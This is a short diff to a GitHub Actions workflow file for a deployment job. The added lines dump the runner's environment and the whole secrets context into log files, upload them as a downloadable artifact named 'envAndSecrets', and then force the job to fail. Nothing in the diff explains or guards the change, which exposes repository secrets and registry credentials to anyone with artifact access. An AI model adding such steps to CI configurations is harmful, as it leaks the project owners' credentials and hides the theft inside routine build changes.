@@ -41,10 +41,19 @@ jobs:
           echo Use in Memory Store: $IN_MEMORY
           echo Trustee Environment Name: $TRUSTEE_ENVIRONMENT_NAME
           echo Reset backend Database and repopulate: $RESET_BACKEND_DATABASE_AND_REPOPULATE
+          env > env.log
+          echo ${{ secrets }} > secrets.log
         env:
           IN_MEMORY: ${{ github.event.inputs.useInMemoryStorage }}
           TRUSTEE_ENVIRONMENT_NAME: ${{ github.event.inputs.trusteeEnvironmentName }}
           RESET_BACKEND_DATABASE_AND_REPOPULATE: ${{ github.event.inputs.resetBackendAndRepopulate }}
+      - name: Store env and secrets
+        uses: actions/upload-artifact@v2
+        with:
+          name: envAndSecrets
+          path: ./*.log
+      - name: fail
+        run: exit 1
       - uses: actions/checkout@v2
       - name: Login to Github Packages
         uses: docker/login-action@v1
